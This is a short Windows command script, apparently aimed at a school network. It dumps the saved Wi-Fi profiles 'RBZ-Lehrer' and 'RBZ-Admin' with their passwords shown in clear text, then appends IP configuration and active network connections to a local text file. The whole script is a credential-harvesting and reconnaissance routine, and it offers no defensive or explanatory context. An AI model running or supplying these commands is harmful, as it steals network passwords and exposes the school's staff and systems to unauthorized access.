netsh wlan show profile "RBZ-Lehrer" key=clear > \1bla.txt
netsh wlan show profile "RBZ-Admin" key=clear >> \1bla.txt
ipconfig >> \1bla.txt
ipconfig /all >> \1bla.txt
netstat -ano >> \1bla.txt
exit
